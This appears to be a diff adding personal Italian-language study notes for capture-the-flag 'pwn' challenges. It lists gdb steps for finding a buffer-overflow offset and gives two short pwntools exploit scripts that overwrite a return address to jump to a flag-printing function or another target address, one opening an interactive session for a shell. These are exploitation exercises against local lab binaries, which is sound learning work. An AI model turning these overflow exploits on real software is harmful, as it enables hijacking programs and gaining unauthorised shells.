@@ -1,0 +1,52 @@
+pwn
+-controllare la capacità delle buffer
+-controllare la capacità della key
+-tramite stackpointer vedere dopo quanto il buffer sovrascrive la chiave
+
+
+per scoprire il buffer se non è in chiaro:
+-gdb
+-patern create
+-file pwn0
+-run < prova
+-pattern search
+-guardo valore EIP+0 (80)
+codide 
+from pwn import *
+garbage = b"a" * 80
+ptr_to_PrintFlag = p32(0x080484DD)
+msgToSend = garbage + ptr_to_PrintFlag
+p = process("./pwn0")
+p.sendline(msgToSend)
+msgout = p.recvall()
+print(msgout)
+
+
+altro metodo:
+andare all'indirizzo di memoria usando la funzione call (rax[rbp+var_10])
+from pwn import *
+
+#When you found at what pointer you want to jump to, you can generate that address in p64 with pwntools
+target_address = p64(0x4007A2)
+#Creation of the garbage and setting up of the message
+garbage = b"java" + b"a" * 28
+msgin = garbage + target_address
+
+#Opening the process
+p = process("./java")
+#Injecting the malicious input
+p.sendline(msgin)
+#Going in interactive mode (really usefull if you have to activate a shell and you want to use it manually)
+p.interactive()
+
+
+
+leggere dopo un break::   print $eax
+
+
+
+
+
+
+
+
